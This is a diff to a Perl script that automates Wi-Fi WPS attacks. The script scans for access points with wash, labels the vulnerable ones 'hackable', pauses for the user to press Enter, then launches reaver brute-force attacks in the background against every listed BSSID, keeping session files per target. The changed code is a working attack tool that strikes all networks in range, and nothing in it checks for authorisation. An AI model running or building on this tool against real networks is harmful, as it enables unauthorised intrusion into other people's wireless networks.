@@ -216,9 +216,24 @@ print "\n\n::::: ===============================================================
 print "\n::::: =================================================================================";
 print "\n::::: =================================================================================";
 print "\n::::: TEST RUN FIN ---- RESULTS FOLLOW ----";
-print_hackable();
 
-#attack thei hackable networks
+$washline="";
+print "\n\n::::: >>>>> hackable devices <<<<<";
+$hackable_targets=@attackable;
+print "\n::::: STATS: out of $possible_targets possible targets there are $hackable_targets hackable targets";
+foreach (@attackable) {
+	print"\n -----> $_ ";
+}
+
+print "\nEnter to continue ...";
+my $ok = <>; # ask for user input
+if ( $ok == ""){
+}
+else{
+die;
+}
+
+#attack the hackable networks
 foreach $current_bssid ( @attackable ){
 	attack_hackable();
 }
@@ -232,22 +247,6 @@ exit 0;
 ######################################################## SUBS ###########################################################################
 ######################################################## SUBS ###########################################################################
 ######################################################## SUBS ###########################################################################
-
-sub print_hackable{
-	$washline="";
-	print "\n\n::::: >>>>> hackable devices <<<<<";
-	$hackable_targets=@attackable;	
-	print "\n::::: STATS: out of $possible_targets possible targets there are $hackable_targets hackable targets";
-	foreach (@attackable) {
-		foreach my $hackabledev (@washlog) {
-			if ($hackabledev =~ /$current_bssid/) {
-				print "-----> $hackabledev";
-				$washline=$hackabledev;
-			}
-		}
-		print"\n -----> $_ n";
-	}
-}
 
 
 
@@ -435,13 +434,7 @@ sub wash_wrapper_get_results {
 	if ($tmp eq 0) {
 		print "\t no results ..... NO Networks OR no wlan device available \n::::: FIXME FIXME check airmon results";
 	}
-
-#	foreach (@washlog) {
-#		print "::::: >>>>>>>  $_";
-#		
-#	}		
 }
-
 
 
 sub runtestattack {
@@ -502,18 +495,16 @@ sub attack_hackable {
 	$washline="";
 	$ap_rate_limit="0";
         $beaconwait="0";
-	if ($direct eq '0') { 
-		foreach (@washlog) {	
-			if ($_ =~ $current_bssid ) {
-				$washline=$_;
-			}
-		}
-	}
+
+	if ($current_bssid =~ /([0-9a-f]{2}):([0-9a-f]{2}):([0-9a-f]{2}):([0-9a-f]{2}):([0-9a-f]{2}):([0-9a-f]{2})/i) {
+                $bssid_without_colon="$1$2$3$4$5$6";
+        }
+        $cmd="reaver -v -i $mondev -b $current_bssid -a -s /usr/local/etc/reaver/$bssid_without_colon.wpc > $logfile 2>&1 ";
+
 	print "\n::::: ==================================================================================================================";
 	print "\n:::::  Attacking";
 	print "\n::::: ==================================================================================================================";
 	print "\n::::: >>>>>>>>>> running reaper against $current_bssid";
-	print "\n::::: >>>>>>>>>> $washline";
 	print "\n::::: >>>>>>>>>> $cmd";
 	system ("$cmd &");
 	sleep 1;
